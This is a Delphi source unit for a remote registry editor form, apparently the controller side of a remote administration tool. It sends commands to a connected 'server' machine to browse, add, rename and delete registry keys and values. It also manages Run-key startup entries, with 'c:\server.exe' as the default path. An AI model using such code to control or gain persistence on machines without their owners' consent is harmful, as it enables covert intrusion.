unit UnitRegedit;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ExtCtrls, UnitMain, Menus, AppEvnts, UnitConexao, sSkinProvider;

type
  TFormRegedit = class(TForm)
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    Novo1: TMenuItem;
    Chave1: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    Valordasequncia1: TMenuItem;
    Valorbinrio1: TMenuItem;
    ValorDWORD1: TMenuItem;
    Valordesequnciamltipla1: TMenuItem;
    Valordesequnciaespansvel1: TMenuItem;
    Editar1: TMenuItem;
    Excluir1: TMenuItem;
    Renomear1: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    Splitter1: TSplitter;
    PopupMenu2: TPopupMenu;
    Listarregistros1: TMenuItem;
    Excluir2: TMenuItem;
    N3: TMenuItem;
    Novo2: TMenuItem;
    Panel1: TPanel;
    TreeView1: TTreeView;
    Panel2: TPanel;
    AdvListView1: TListView;
    Panel3: TPanel;
    AdvListView2: TListView;
    sSkinProvider1: TsSkinProvider;
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure TreeView1GetSelectedIndex(Sender: TObject; Node: TTreeNode);
    procedure TreeView1DblClick(Sender: TObject);
    procedure Valordasequncia1Click(Sender: TObject);
    procedure Chave1Click(Sender: TObject);
    procedure Excluir1Click(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Renomear1Click(Sender: TObject);
    procedure Editar1Click(Sender: TObject);
    procedure Listarregistros1Click(Sender: TObject);
    procedure PopupMenu2Popup(Sender: TObject);
    procedure Excluir2Click(Sender: TObject);
    procedure Novo2Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    SelectedNode: array [1..99999] of TTreeNode;
    NodeAtual: integer;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormRegedit: TFormRegedit;

implementation

{$R *.dfm}

uses
  UnitConstantes,
  UnitStrings,
  CustomIniFiles,
  UnitEditarRegistro,
  UnitCommonProcedures,
  UnitNewStartUp;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormRegedit.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormRegedit.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormRegedit.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

function GetFullPath(Node: TTreeNode): string;
begin
  Result := Node.Text;

  while Node.Parent <> nil do
  begin
    Node := Node.Parent;
    Result := IncludeTrailingBackSlash(Node.Text) + IncludeTrailingBackSlash(Result);
  end;
end;

function FindNode(Caption: string; Treeview: TTreeview; node: TTreenode): TTreeNode;
var
  i: integer;
begin
  result := nil;
  if Node = nil then begin
    for i := 0 to treeview.Items.Count -1 do begin
      if uppercase(treeview.Items[i].Text) = uppercase(caption) then result := treeview.Items[i];
      //BREAK;
    end;
  end else begin
    for i := 0 to node.Count -1 do begin
      if uppercase(node.Item[i].Text) = uppercase(caption) then result := node.Item[i];
      //BREAK;
    end;
  end;
end;

function GetParentNode(Node: TTreenode): string;
var
  s: string;
begin
  s := Node.Text;
  while Node.Parent <> nil do begin
    result := includetrailingbackslash(Node.Parent.Text) + result;
    Node := Node.Parent;
  end;
  result := result + includetrailingbackslash(s);
end;

procedure TFormRegedit.AtualizarIdioma;
begin
  Treeview1.Items.Item[0].Text := traduzidos[280];
  AdvListView1.Column[0].Caption := traduzidos[282];
  AdvListView1.Column[1].Caption := traduzidos[283];
  AdvListView1.Column[2].Caption := traduzidos[284];

  Novo1.Caption := traduzidos[285];
  Editar1.Caption := traduzidos[286];
  Excluir1.Caption := traduzidos[287];
  Renomear1.Caption := traduzidos[288];
  Chave1.Caption := traduzidos[289];
  Valordasequncia1.Caption := traduzidos[290];
  Valorbinrio1.Caption := traduzidos[291];
  ValorDWORD1.Caption := traduzidos[292];
  Valordesequnciamltipla1.Caption := traduzidos[293];
  Valordesequnciaespansvel1.Caption := traduzidos[294];
  Novo2.Caption := traduzidos[285];
  Excluir2.Caption := traduzidos[287];
  AdvListView2.Column[0].Caption := traduzidos[299];
  AdvListView2.Column[1].Caption := traduzidos[300];
  AdvListView2.Column[2].Caption := traduzidos[301];
  Listarregistros1.Caption := traduzidos[302];

  Tabsheet1.Caption := traduzidos[303];
  Tabsheet2.Caption := traduzidos[304];

end;

constructor TFormRegedit.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('Regedit', 'Width', Width);
    Height := IniFile.ReadInteger('Regedit', 'Height', Height);
    Left := IniFile.ReadInteger('Regedit', 'Left', Left);
    Top := IniFile.ReadInteger('Regedit', 'Top', Top);
    TreeView1.Width := IniFile.ReadInteger('Regedit', 'TV1', TreeView1.Width);
    AdvListView1.Column[0].Width := IniFile.ReadInteger('Regedit', 'LV1_0', AdvListView1.Column[0].Width);
    AdvListView1.Column[1].Width := IniFile.ReadInteger('Regedit', 'LV1_1', AdvListView1.Column[1].Width);
    AdvListView1.Column[2].Width := IniFile.ReadInteger('Regedit', 'LV1_2', AdvListView1.Column[2].Width);
    AdvListView2.Column[0].Width := IniFile.ReadInteger('Regedit', 'LV2_0', AdvListView2.Column[0].Width);
    AdvListView2.Column[1].Width := IniFile.ReadInteger('Regedit', 'LV2_1', AdvListView2.Column[1].Width);
    AdvListView2.Column[2].Width := IniFile.ReadInteger('Regedit', 'LV2_2', AdvListView2.Column[2].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

function KeyTypeToStr(sKey: String): string;
var
  i: integer;
begin
  i := strtoint(sKey);
  if i = REG_DWORD then Result := 'REG_DWORD';
  if i = REG_BINARY then Result := 'REG_BINARY';
  if i = REG_EXPAND_SZ then Result := 'REG_EXPAND_SZ';
  if i = REG_MULTI_SZ then Result := 'REG_MULTI_SZ';
  if i = REG_SZ then Result := 'REG_SZ';
  if i = REG_NONE then Result := 'REG_NONE';
end;

procedure TFormRegedit.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: integer;
  Item: TListItem;
  TempStr: string;
  i: integer;
  Result: TSplit;
  TempNode, RealNode: TTreeNode;
  StartUpType: string;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADECHAVES then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if TempInt = 0 then exit;
    delete(Recebido, 1, posex('|', Recebido));

    RealNode := SelectedNode[TempInt];
    RealNode.DeleteChildren;

    TreeView1.Items.BeginUpdate;
    try
      while (Recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(RegeditDelimitador, Recebido) - 1);  //Nome da Chave + MasterDelimitador + Número + MasterDelimitador + #13#10
        Delete(Recebido, 1, posex(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, length(RegeditDelimitador));

        TempStr := Copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
        if TempStr = '' then continue;
      
        TempNode := TreeView1.Items.AddChild(RealNode, pchar(TempStr));
        TempNode.ImageIndex := 1;
        TempNode.SelectedIndex := 0;
      end;
      finally
      TreeView1.Items.EndUpdate;
    end;
    RealNode.Expand(false);
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEDADOS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    AdvListView1.Items.BeginUpdate;
    try
      if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
      while (Recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, posex(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, length(RegeditDelimitador));

        Result := SplitString(TempStr, delimitadorComandos);
        Item := AdvListView1.Items.Add;
        Item.Caption := Result[0];
        Item.SubItems.Add(KeyTypeToStr(Result[1]));
        Item.SubItems.Add(Result[2]);
        Item.Data := TObject(Result[2]);
        if (strtoint(Result[1]) = REG_DWORD) or (strtoint(Result[1]) = REG_BINARY) then Item.ImageIndex := 2
        else Item.ImageIndex := 3;
      end;
      finally
      AdvListView1.Items.EndUpdate;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = STARTUPMANAGER then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    StartUpType := Copy(Recebido, 1, posex('|', Recebido) - 1) + '\Software\Microsoft\Windows\CurrentVersion\Run';
    delete(Recebido, 1, posex('|', Recebido));

    AdvListView2.Items.BeginUpdate;
    try
      while (Recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, posex(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, length(RegeditDelimitador));

        Result := SplitString(TempStr, delimitadorComandos);
        Item := AdvListView2.Items.Add;
        if (strtoint(Result[1]) = REG_DWORD) or (strtoint(Result[1]) = REG_BINARY) then Item.ImageIndex := 2
        else Item.ImageIndex := 3;
        Item.Caption := Result[0];
        Item.SubItems.Add(Result[2]);
        Item.SubItems.Add(StartUpType);
        Item.Data := TObject(Result[2]);
      end;
      finally
      AdvListView2.Items.EndUpdate;
    end;
  end else

  begin

  end;
end;

procedure TFormRegedit.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;
  AdvListView2.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('Regedit', 'Width', Width);
    IniFile.WriteInteger('Regedit', 'Height', Height);
    IniFile.WriteInteger('Regedit', 'Left', Left);
    IniFile.WriteInteger('Regedit', 'Top', Top);
    IniFile.WriteInteger('Regedit', 'TV1', TreeView1.Width);
    IniFile.WriteInteger('Regedit', 'LV1_0', AdvListView1.Column[0].Width);
    IniFile.WriteInteger('Regedit', 'LV1_1', AdvListView1.Column[1].Width);
    IniFile.WriteInteger('Regedit', 'LV1_2', AdvListView1.Column[2].Width);
    IniFile.WriteInteger('Regedit', 'LV2_0', AdvListView2.Column[0].Width);
    IniFile.WriteInteger('Regedit', 'LV2_1', AdvListView2.Column[1].Width);
    IniFile.WriteInteger('Regedit', 'LV2_2', AdvListView2.Column[2].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormRegedit.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  if AdvListView2.Items.Count > 0 then AdvListView2.Items.Clear;
end;

procedure TFormRegedit.FormShow(Sender: TObject);
var
  MasterNode: TTreeNode;
  TempNode: TTreeNode;
begin
  PageControl1.TabIndex := 0;

  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  if AdvListView2.Items.Count > 0 then AdvListView2.Items.Clear;

  AtualizarIdioma;
  ZeroMemory(@SelectedNode, Sizeof(SelectedNode));
  NodeAtual := 1;

  MasterNode := TreeView1.Items.Item[0];
  MasterNode.DeleteChildren;

  TempNode := TreeView1.Items.AddChild(MasterNode, 'HKEY_CLASSES_ROOT');
  TempNode.SelectedIndex := 0;
  TempNode.ImageIndex := 1;
  TempNode := TreeView1.Items.AddChild(MasterNode, 'HKEY_CURRENT_USER');
  TempNode.SelectedIndex := 0;
  TempNode.ImageIndex := 1;
  TempNode := TreeView1.Items.AddChild(MasterNode, 'HKEY_LOCAL_MACHINE');
  TempNode.SelectedIndex := 0;
  TempNode.ImageIndex := 1;
  TempNode := TreeView1.Items.AddChild(MasterNode, 'HKEY_USERS');
  TempNode.SelectedIndex := 0;
  TempNode.ImageIndex := 1;
  TempNode := TreeView1.Items.AddChild(MasterNode, 'HKEY_CURRENT_CONFIG');
  TempNode.SelectedIndex := 0;
  TempNode.ImageIndex := 1;

  TreeView1.SetFocus;
end;

procedure TFormRegedit.Listarregistros1Click(Sender: TObject);
begin
  AdvListView2.Items.Clear;
  Servidor.EnviarString(STARTUPMANAGER + '|');
end;

procedure TFormRegedit.Novo2Click(Sender: TObject);
var
  Form: TFormNewStartUp;
  Dados, Tempstr: string;
begin
  Form := TFormNewStartUp.create(application);
  try
  	Form.Caption := '';
    Form.ComboBox1.ItemIndex := 0;
    Form.Edit1.Text := Traduzidos[281];
    Form.Edit2.Text := 'c:\server.exe';
    Form.Label1.Caption := Traduzidos[305];
    Form.Label2.Caption := Traduzidos[306];

    if Form.ShowModal = mrOK then
    begin
      Dados := Form.Edit2.Text;
      TempStr := Form.Edit1.Text;
      if (Dados <> '') and (TempStr <> '') then
      begin
        Servidor.enviarString(
                     NOVOREGISTRO + '|' +
                     Form.ComboBox1.Items.Strings[Form.ComboBox1.ItemIndex] + '\Software\Microsoft\Windows\CurrentVersion\Run\' + delimitadorComandos +
                     TempStr + delimitadorComandos +
                     'REG_SZ' + delimitadorComandos +
                     Dados);
      end else
      begin

      end;
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormRegedit.TreeView1GetSelectedIndex(Sender: TObject; Node: TTreeNode);
var
  TempStr: string;
begin
  if TreeView1.Selected = nil then exit;

  if TreeView1.Selected.Text = traduzidos[280] then
  begin
    StatusBar1.Panels.Items[0].Text := traduzidos[280];
    exit;
  end;

  TempStr := GetFullPath(TreeView1.Selected);
  StatusBar1.Panels.Items[0].Text := TempStr;
end;

procedure TFormRegedit.TreeView1DblClick(Sender: TObject);
var
  TempStr: string;
begin
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  if Treeview1.Selected = nil then exit;
  if Treeview1.Selected.Text = traduzidos[280] then Exit;

  SelectedNode[NodeAtual] := Treeview1.Selected;
  TempStr := GetFullPath(Treeview1.Selected);
  delete(TempStr, 1, posex('\', TempStr));

  Servidor.EnviarString(LISTADECHAVES + '|' + IntToStr(NodeAtual) + '|' + TempStr);
  inc(NodeAtual);
  Servidor.EnviarString(LISTADEDADOS + '|' + TempStr);
end;

procedure TFormRegedit.Valordasequncia1Click(Sender: TObject);
var
  Tipo: integer;
  Item: TMenuItem;
  Form: TFormEditarRegistro;
  Dados: string;
  TempStr: string;
begin
  Item := TMenuItem(Sender);
  if Item = PopupMenu1.Items.Items[0].Items[2] then Tipo := 0 else
  if Item = PopupMenu1.Items.Items[0].Items[3] then Tipo := 1 else
  if Item = PopupMenu1.Items.Items[0].Items[4] then Tipo := 2 else
  if Item = PopupMenu1.Items.Items[0].Items[5] then Tipo := 3 else
  if Item = PopupMenu1.Items.Items[0].Items[6] then Tipo := 4;

  Form := TFormEditarRegistro.create(application);
  try
  	Form.Caption := '';
    Form.AdvOfficeRadioGroup1.ItemIndex := Tipo;
    Form.Edit1.Text := Traduzidos[281];
    Form.Memo1.Clear;
    Form.Label1.Caption := AdvListView1.Column[0].Caption;
    Form.Label2.Caption := AdvListView1.Column[2].Caption;
    Form.AdvOfficeRadioGroup1.Caption := AdvListView1.Column[1].Caption;

    if Form.ShowModal = mrOK then
    begin
      Dados := Form.Memo1.Text;
      TempStr := StatusBar1.Panels.Items[0].Text;
      if TempStr <> traduzidos[280] then
      delete(TempStr, 1, posex('\', TempStr));
      if TempStr <> '' then
      Servidor.enviarString(
                   NOVOREGISTRO + '|' +
                   TempStr + delimitadorComandos +
                   Form.Edit1.Text + delimitadorComandos +
                   Form.AdvOfficeRadioGroup1.Items.Strings[Form.AdvOfficeRadioGroup1.itemIndex] + delimitadorComandos +
                   Dados);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormRegedit.Chave1Click(Sender: TObject);
var
  TempStr: string;
  Nova: string;
begin
  if Treeview1.Selected = nil then exit;
  if Treeview1.Selected.Text = traduzidos[280] then Exit;
  Nova := traduzidos[295];
  if InputQuery(traduzidos[295], traduzidos[296] + ':', Nova) = false then exit;

  TempStr := GetFullPath(Treeview1.Selected);
  delete(TempStr, 1, posex('\', TempStr));
  Servidor.EnviarString(NOVACHAVE + '|' + TempStr + delimitadorComandos + Nova);
end;

procedure TFormRegedit.Excluir1Click(Sender: TObject);
var
  TempStr: string;
begin
  TempStr := StatusBar1.Panels.Items[0].Text;
  if TempStr = traduzidos[280] then exit;
  delete(TempStr, 1, posex('\', TempStr));
  if TempStr = '' then exit;

  if PopupMenu1.PopupComponent.ClassType = TListView then
  begin
    if AdvListView1.Selected = nil then exit;
    if MessageDlg(pchar(traduzidos[297]) + ' "' + AdvListView1.Selected.Caption + '" ?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
    begin
      Servidor.EnviarString(APAGARREGISTRO + '|' +
                   TempStr + delimitadorComandos +
                   AdvListView1.Selected.Caption);
    end;
    exit;
  end;

  if TreeView1.Selected = nil then exit;
  if MessageDlg(pchar(traduzidos[298]) + ' "' + TreeView1.Selected.Text + '" ?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
  Servidor.EnviarString(APAGARCHAVE + '|' + TempStr);
end;

procedure TFormRegedit.Excluir2Click(Sender: TObject);
var
  TempStr: string;
begin
  TempStr := AdvListView2.Selected.SubItems.Strings[1];
  if Copy(TempStr, 1, posex('\', TempStr) - 1) = 'HKLM' then
  begin
    Delete(TempStr, 1, posex('\', TempStr));
    TempStr := 'HKEY_LOCAL_MACHINE\' + TempStr;
  end else
  if Copy(TempStr, 1, posex('\', TempStr) - 1) = 'HKCU' then
  begin
    Delete(TempStr, 1, posex('\', TempStr));
    TempStr := 'HKEY_CURRENT_USER\' + TempStr;
  end else exit;

  if MessageDlg(pchar(traduzidos[297]) + ' "' + AdvListView2.Selected.Caption + '" ?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
  begin
    Servidor.EnviarString(APAGARREGISTRO + '|' +
                 TempStr + delimitadorComandos +
                 AdvListView2.Selected.Caption);
  end;
  if AdvListView2.Items.Count > 0 then AdvListView2.Items.Clear;
  Servidor.EnviarString(STARTUPMANAGER + '|');
end;

function CharCount(C: Char; Str: string): integer;
var
  i: integer;
begin
  result := 0;
  if Str = '' then exit;
  for i := 1 to length(Str) do if Str[i] = C then inc(result);
end;

procedure TFormRegedit.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  if PopupMenu1.PopupComponent.ClassType = TListView then
  begin
    for i := PopupMenu1.Items.Count - 1 downto 0 do PopupMenu1.Items.Items[i].Enabled := false;
    if AdvListView1.Selected = nil then
    begin
      TempStr := StatusBar1.Panels.Items[0].Text;
      if TempStr = traduzidos[280] then exit;
      delete(TempStr, 1, posex('\', TempStr));
      if TempStr = '' then exit;

      Novo1.Enabled := true;
      exit;
    end;
    TempStr := StatusBar1.Panels.Items[0].Text;
    if TempStr = traduzidos[280] then exit;
    delete(TempStr, 1, posex('\', TempStr));
    if TempStr = '' then exit;

    for i := PopupMenu1.Items.Count - 1 downto 0 do PopupMenu1.Items.Items[i].Enabled := true;
    exit;
  end;

  for i := PopupMenu1.Items.Count - 1 downto 0 do PopupMenu1.Items.Items[i].Enabled := false;

  if TreeView1.Selected = nil then exit;
  TempStr := StatusBar1.Panels.Items[0].Text;
  if TempStr = traduzidos[280] then exit;
  delete(TempStr, 1, posex('\', TempStr));
  if TempStr = '' then exit;

  for i := PopupMenu1.Items.Count - 1 downto 0 do PopupMenu1.Items.Items[i].Enabled := true;
  Editar1.Enabled := false;

  if CharCount('\', TempStr) <= 1 then
  begin
    Excluir1.Enabled := false;
    Renomear1.Enabled := false;
  end;
end;

procedure TFormRegedit.PopupMenu2Popup(Sender: TObject);
begin
  Excluir2.Enabled := AdvListView2.Selected <> nil;
end;

procedure TFormRegedit.Renomear1Click(Sender: TObject);
var
  TempStr: string;
  HKEY, SubKey, OldValue, NewValue: string;
begin
  if PopupMenu1.PopupComponent.ClassType = TListView then
  begin
    if AdvListView1.Selected = nil then exit;
    TempStr := StatusBar1.Panels.Items[0].Text;
    if TempStr = traduzidos[280] then exit;
    delete(TempStr, 1, posex('\', TempStr));
    if TempStr = '' then exit;

    HKEY := Copy(TempStr, 1, posex('\', TempStr) - 1);
    if HKEY = '' then exit;
    delete(TempStr, 1, posex('\', TempStr));
    SubKey := TempStr;
    if SubKey[Length(subkey)] = '\' then delete(subkey, length(subkey), 1);

    OldValue := AdvListView1.Selected.Caption;

    NewValue := AdvListView1.Selected.Caption;
    if InputQuery(traduzidos[295], traduzidos[296] + ':', NewValue) = false then exit;

    Servidor.enviarString(
                 RENOMEARREGISTRO + '|' +
                 HKEY + delimitadorComandos +
                 SubKey + delimitadorComandos +
                 AdvListView1.Selected.SubItems.Strings[0] + delimitadorComandos +
                 OldValue + delimitadorComandos +
                 String(AdvListView1.Selected.Data) + delimitadorComandos +
                 NewValue);
    exit;
  end;

  if TreeView1.Selected = nil then exit;
  TempStr := StatusBar1.Panels.Items[0].Text;
  if TempStr = traduzidos[280] then exit;
  delete(TempStr, 1, posex('\', TempStr));
  if TempStr = '' then exit;

  HKEY := Copy(TempStr, 1, posex('\', TempStr) - 1);
  if HKEY = '' then exit;
  delete(TempStr, 1, posex('\', TempStr));
  SubKey := TempStr;
  if SubKey[Length(subkey)] = '\' then delete(subkey, length(subkey), 1);
  SubKey := copy(SubKey, 1, LastDelimiter('\', SubKey) - 1);

  OldValue := TreeView1.Selected.Text;

  NewValue := TreeView1.Selected.Text;
  if InputQuery(traduzidos[295], traduzidos[296] + ':', NewValue) = false then exit;

  //MessageBox(Handle, pchar(HKEY + #13#10 +
  //                    SubKey + #13#10 +
  //                    OldValue + #13#10 +
  //                    NewValue), '', 0);
  Servidor.EnviarString(RENOMEARCHAVE + '|' +
               HKEY + delimitadorComandos +
               SubKey + delimitadorComandos +
               OldValue + delimitadorComandos +
               NewValue + delimitadorComandos);

end;

function StrToKeyType(sKey: String): integer;
begin
  if sKey = 'REG_SZ' then Result := 0;
  if sKey = 'REG_BINARY' then Result := 1;
  if sKey = 'REG_DWORD' then Result := 2;
  if sKey = 'REG_MULTI_SZ' then Result := 3;
  if sKey = 'REG_EXPAND_SZ' then Result := 4;
end;

procedure TFormRegedit.Editar1Click(Sender: TObject);
var
  Tipo: integer;
  Item: TMenuItem;
  Form: TFormEditarRegistro;
  Dados: string;
  TempStr: string;
begin
  if AdvListView1.Selected = nil then exit;
  TempStr := StatusBar1.Panels.Items[0].Text;
  if TempStr = traduzidos[280] then exit;
  delete(TempStr, 1, posex('\', TempStr));
  if TempStr = '' then exit;

  Form := TFormEditarRegistro.create(application);
  try
  	Form.Caption := '';
    Form.AdvOfficeRadioGroup1.ItemIndex := StrToKeyType(AdvListView1.Selected.SubItems.Strings[0]);
    Form.Edit1.Text := AdvListView1.Selected.Caption;
    Form.Memo1.Text := string(AdvListView1.Selected.Data);
    Form.Label1.Caption := AdvListView1.Column[0].Caption;
    Form.Label2.Caption := AdvListView1.Column[2].Caption;
    Form.AdvOfficeRadioGroup1.Caption := AdvListView1.Column[1].Caption;
    Form.Edit1.Enabled := false;

    if Form.ShowModal = mrOK then
    begin
      Dados := Form.Memo1.Text;
      TempStr := StatusBar1.Panels.Items[0].Text;
      if TempStr <> traduzidos[280] then
      delete(TempStr, 1, posex('\', TempStr));
      if TempStr <> '' then
      Servidor.enviarString(
                   NOVOREGISTRO + '|' +
                   TempStr + delimitadorComandos +
                   Form.Edit1.Text + delimitadorComandos +
                   Form.AdvOfficeRadioGroup1.Items.Strings[Form.AdvOfficeRadioGroup1.itemIndex] + delimitadorComandos +
                   Dados);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;


end.
